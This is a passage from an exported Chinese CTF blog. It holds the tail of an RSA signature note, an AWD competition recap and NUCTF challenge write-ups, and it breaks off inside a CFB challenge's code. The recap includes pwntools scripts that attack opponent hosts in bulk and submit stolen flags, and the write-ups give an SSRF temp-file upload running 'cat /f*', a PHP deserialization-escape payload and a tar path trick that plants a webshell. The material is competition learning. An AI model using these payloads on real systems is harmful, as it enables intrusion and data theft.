<img alt="20210529 DASCTFXBUUOJ五月大联动-b88cacaf.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-b88cacaf.png" width="" height="" >

<p><strong>公钥认证，私钥加密</strong>，这句话很重要</p>
<p>虽然数字签名还没有上到，但思路也是一种加密手段，用来证明这是某人发送的消息，所以对其进行解密，也能获取某种东西从而进行验证，现在只会网上的一些工具，rsa的签名过程后续会补上</p>
<p>巧了，第二天就上到了，你说妙不妙，用理论知识武装头脑.jpg</p>
<p>没想到很简单，所谓用公钥签名就是：$用d给m加密即，m这里指的是像现实中合同一样的信息$</p>
<p>用代数符号也就是<br>$$<br>sign=m^d\ mod\ n<br>$$<br>那么解密也就很简单啦<br>$$<br>m=sign^e\ mod\ n<br>$$<br>代码实现想必不需要赘述了吧</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-d388a46f.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-d388a46f.png" width="" height="" >

<p>你说气不气，就差亿点点点就可以助攻彭总了</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>斐波那契数列和RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>20210617 记国赛线下AWD选拔赛</title>
    <url>/posts/3a78d3e0/</url>
    <content><![CDATA[<p>我是一块砖，需要就往哪里搬。震惊，密码师傅零基硬刚PWN，结果被凑得鼻青脸肿</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/记国赛线下AWD选拔赛-11a8defc.png" alt="昂？"/>

<p>三个月后回头看，发现自己真的是太菜了，别的密码师傅都可以国赛中打得很自在，自己却被一天罚站。学习的面可以广啊。做这一行，<strong>只能有长板和无数个中板</strong></p>
<span id="more"></span>

<h1 id="20210617-记国赛线下AWD选拔赛"><a href="#20210617-记国赛线下AWD选拔赛" class="headerlink" title="20210617 记国赛线下AWD选拔赛"></a>20210617 记国赛线下AWD选拔赛</h1><h2 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h2><p>当时的放在桌子上的文件</p>
<img alt="README-7b68301e.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-7b68301e.png" width="" height="">

<p>点开那个网络配置，然后双击ipv4，自动获取ip，然后查看下ipconfig就好了</p>
<img alt="README-2be6a323.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-2be6a323.png" width="" height="">

<h2 id="PWN文件的下载"><a href="#PWN文件的下载" class="headerlink" title="PWN文件的下载"></a>PWN文件的下载</h2><blockquote>
<p>使用sftp</p>
</blockquote>
<h3 id="步骤一：连接靶机"><a href="#步骤一：连接靶机" class="headerlink" title="步骤一：连接靶机"></a>步骤一：连接靶机</h3><p>有一种是输入密码的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sftp -p [端口号] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<p>输入密码，进入端口</p>
<p>还有一种是用私钥文件认证的</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sftp -i [私钥文件] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<p><em>这次遇到的是后一种，输入密码的听说是相同的、或者是弱密码可以抢先别人一步拿到密码并且改掉，但是用RSA签名认证的应该就不会出现这种情况</em></p>
<h3 id="步骤二：文件下载和上传"><a href="#步骤二：文件下载和上传" class="headerlink" title="步骤二：文件下载和上传"></a>步骤二：文件下载和上传</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">lpwd  <span class="comment"># 查看本地文件路径lpath</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>   <span class="comment"># 查看远程路径path</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">get lpath path    <span class="comment"># 下载文件</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">put path          <span class="comment"># 上传文件</span></span><br></pre></td></tr></table></figure>

<p>或说这两个我从来没有成功过，当时比赛是用图形化界面的ssh拉下来的，使用相对也比较简单</p>
<img alt="README-a08a1141.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-a08a1141.png" width="" height="">

<blockquote>
<p>ssh</p>
</blockquote>
<p>操作的过程和sftp差不多，因为ssh内含sftp协议，比如连接的命令就是</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -i [私钥文件] 用户名@IP地址</span><br></pre></td></tr></table></figure>

<h2 id="当PWN遇上流量分析"><a href="#当PWN遇上流量分析" class="headerlink" title="当PWN遇上流量分析"></a>当PWN遇上流量分析</h2><p>写了两个利用攻击来源的流量包分析出的还有点用处的手动化脚本</p>
<p>有了第一天的经验，第二天直接分析流量包。而且比赛开始没几分钟，就有队伍PWN题打过来了，拿到packages看看</p>
<p>追踪TCP流</p>
<img alt="记国赛线下AWD选拔赛-f9a23239.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/记国赛线下AWD选拔赛-f9a23239.png" width="" height="">

<p>这是PWN2的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12</span><br><span class="line">++++++++++X</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DJR</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是PWN3的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">985</span><br><span class="line">10</span><br><span class="line">985</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6</span><br><span class="line">flappybird666666</span><br></pre></td></tr></table></figure>

<p>打PWN2的脚本，我写的主要有几个问题</p>
<ol>
<li><p>不能每隔十分钟自动跑，新的一轮要手动跑几次，但是后面也就是在跑这两个脚本了，然后改改一些小的地方，没别的事做，所以还好</p>
</li>
<li><p>有一些IP是修好的，或者是即使没有修好，输入输出流之间可能会有EOF错误（PWN师傅说要sleep一下，后续研究）导致有些会卡住程序运行，所以在手跑的时候，需要将连接不好又不能跳过的IP去掉一下</p>
<img alt="README-6d5540d6.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-6d5540d6.png" width="" height="" ></li>
</ol>
<p>这个脚本大概每次会有20~35个flag提交成功，因为很多队伍，包括我们的一队都修好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;4vvfuKfBbHtTtEATCnwV3U4DxQVd5SwEHB8uxruSb4Hmj&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span>(<span class="params">flag1</span>):</span></span><br><span class="line">    url_flag = <span class="string">&#x27;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: flag1,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url_flag, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">x64 = <span class="literal">True</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">50</span>:</span><br><span class="line">        ip.append(<span class="string">&#x27;172.35.&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.17&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ports = <span class="number">9999</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="keyword">if</span> x64:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ipi <span class="keyword">in</span> ip:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ipi <span class="keyword">in</span> [<span class="string">&#x27;172.35.7.17&#x27;</span>]:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        io = remote(ipi, ports)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;12&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;++++++++++X&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;DJR&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;cd ../&#x27;</span>)</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>这是打PWN3的，平均每次可以得到45个flag，但后来发现这题几乎所有的队伍都没有防住，说是可能题目有问题patch了之后check不过，而且还被攻击，第一名的白泽正是如此，所以应该有接近60个的flag，看来中间还是有我没解决的实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;4vvfuKfBbHtTtEATCnwV3U4DxQVd5SwEHB8uxruSb4Hmj&#x27;</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_flag</span>(<span class="params">flag1</span>):</span></span><br><span class="line">    url_flag = <span class="string">&#x27;http://10.16.18.1/api/v1/att_def/web/submit_flag/?event_id=14&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;flag&#x27;</span>: flag1,</span><br><span class="line">        <span class="string">&#x27;token&#x27;</span>: token</span><br><span class="line">    &#125;</span><br><span class="line">    req = requests.post(url=url_flag, data=data, proxies=proxies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">x64 = <span class="literal">True</span></span><br><span class="line">file = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_file = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">if</span> i != <span class="number">50</span>:</span><br><span class="line">        ip.append(<span class="string">&#x27;172.35.&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;.18&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ports = <span class="number">9999</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="keyword">if</span> x64:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ipi <span class="keyword">in</span> ip:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> ipi <span class="keyword">in</span> []:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        io = remote(ipi, ports)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;985&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;flappybird666666&#x27;</span>)</span><br><span class="line">        ra()</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">61</span>:</span><br><span class="line">            submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        a = ra()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a) == <span class="number">61</span>:</span><br><span class="line">            submit_flag(a[:<span class="number">60</span>])</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>虽然确实没有什么技术含量的脚本，但在比赛中还是有点用的吧</p>
<h2 id="一些总结"><a href="#一些总结" class="headerlink" title="一些总结"></a>一些总结</h2><p>还有队内交流真的十分重要，两个随身携带的U盘被我们传来传去</p>
<p>没啥想说的，路还远，时间不多了，走吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210607 NUCTF中北大学校赛Nova底登陆WP</title>
    <url>/posts/d7d40428/</url>
    <content><![CDATA[<p>被姜少带飞的一天，4道Web，1道Misc，1道Crypto</p>
<p>好菜啊，这可如何是好，理论知识这块差太多了，题目都挺有意思的，一句话形容小而精</p>
<span id="more"></span>

<h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h3><p>post</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">crack[me.com=xbingbing/../ssssrf.php  和 ccccmd.php</span><br><span class="line">然后拿到源码</span><br></pre></td></tr></table></figure>

<p>爆破种子，然后得到随机数</p>
<p>?num=396791256&amp;url=<a href="http://127.0.0.1/ccccmd.php">http://127.0.0.1/ccccmd.php</a></p>
<p>可以利用临时文件来解题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /ssssrf.php?num=<span class="number">396791256</span>&amp;url=http:<span class="comment">//127.0.0.1/ccccmd.php?cmd=.%2520/???/????????[@-[] HTTP/1.1</span></span><br><span class="line">Host: <span class="number">97423</span>c6c-f3d2-<span class="number">40</span>b9-a658-<span class="number">96</span>b985773ba1.machine.dasctf.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">89.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">89.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=---------------------------107087596536334691842179134917</span></span><br><span class="line"><span class="comment">Content-Length: 369</span></span><br><span class="line"><span class="comment">Origin: http://localhost</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://localhost/</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-----------------------------107087596536334691842179134917</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">cat /f*</span></span><br><span class="line"><span class="comment">-----------------------------107087596536334691842179134917</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">鎻愪氦</span></span><br><span class="line"><span class="comment">-----------------------------107087596536334691842179134917--</span></span><br></pre></td></tr></table></figure>

<p>持续发包，拿flag。</p>
<h3 id="easyunser"><a href="#easyunser" class="headerlink" title="easyunser"></a>easyunser</h3><p>简单逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;123securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(unserialize(filter(serialize(<span class="keyword">new</span> Hacker()))));</span><br></pre></td></tr></table></figure>

<h3 id="justseria"><a href="#justseria" class="headerlink" title="justseria"></a>justseria</h3><p>用 stdClass类加，取地址加 大 S 16进制绕过</p>
<h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>设置那里找到文件上传点</p>
<p>然后上传后缀白名单限制，结合hint  上传  tar文件。</p>
<p>这个有三个cve，</p>
<p>结合PHAR 协议打发序列化，用  file:// 协议直接上传到指定目录，用符号链接 来链接到指定目录。</p>
<p>符号链接没 打成，用file:// 协议就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"></span><br><span class="line">tar = tarfile.<span class="built_in">open</span>(<span class="string">&#x27;jiang.tar&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;file:///var/www/html/public/uploads/1.php&#x27;</span>)</span><br><span class="line">tar.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.php 是上传的木马，这里需要用绝对路径。</p>
<p>如果PHAR协议也可以用，5.0.24 存在反序列化写shell的链子，可以尝试触发。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>下载拿到一个wav文件，010打开发现奇怪的全部是FF和00</p>
<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/imgimage-20210609161219231.png" alt="image-20210609161219231"></p>
<p>FF 转换为1,00转换为0。用010Editor或者notepad都可以替换。notepad快一点。</p>
<p>如以下格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0101001001100001</span><br><span class="line">0111001000100001</span><br><span class="line">0001101000000111</span><br><span class="line">0000000100000000</span><br><span class="line">1110100111101001</span><br><span class="line">0111101000001010</span><br><span class="line">0000110000000001</span><br><span class="line">0000010100001000</span><br><span class="line">0000000000000111</span><br><span class="line">0000000100000001</span><br><span class="line">1111111011101101</span><br></pre></td></tr></table></figure>

<p>然后猜测为二进制代码，复制为010里的二进制发现是Rar文件。</p>
<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/imgimage-20210609161538055.png" alt="image-20210609161538055"></p>
<p><img data-src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/imgimage-20210609161718346.png" alt="image-20210609161718346"></p>
<p>提取出来后拿到hint.txt,零宽隐写。</p>
<p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>解密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stego online on style********</span><br></pre></td></tr></table></figure>

<p>直接google。<a href="https://stylesuxx.github.io/steganography/">https://stylesuxx.github.io/steganography/</a></p>
<p>解密得到flag。</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="CFB（unsolved）"><a href="#CFB（unsolved）" class="headerlink" title="CFB（unsolved）"></a>CFB（unsolved）</h3><p>比赛伊始，上来一道aes的</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randrange</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">BANNER = <span class="string">br&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">_________                        __                               .__       .___</span></span><br><span class="line"><span class="string">\_   ___ \_______ ___.__._______/  |_  ____   __  _  _____________|  |    __| _/</span></span><br><span class="line"><span class="string">/    \  \/\_  __ &lt;   |  |\____ \   __\/  _ \  \ \/ \/ /  _ \_  __ \  |   / __ |</span></span><br><span class="line"><span class="string">\     \____|  | \/\___  ||  |_&gt; &gt;  | (  &lt;_&gt; )  \     (  &lt;_&gt; )  | \/  |__/ /_/ |</span></span><br><span class="line"><span class="string"> \______  /|__|   / ____||   __/|__|  \____/    \/\_/ \____/|__|  |____/\____ |</span></span><br><span class="line"><span class="string">        \/        \/     |__|                                                \/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">LOGGER = <span class="string">br&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">WELCOME, YOU HAVE THREE CHOICES BELOW!</span></span><br><span class="line"><span class="string">1.Get encrypted flag</span></span><br><span class="line"><span class="string">2.Get encryption</span></span><br><span class="line"><span class="string">3.Exit</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, *args, **kargs</span>):</span></span><br><span class="line">        self.KEY = <span class="string">b&quot;&quot;</span></span><br><span class="line">        self.IV = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(*args, **kargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = 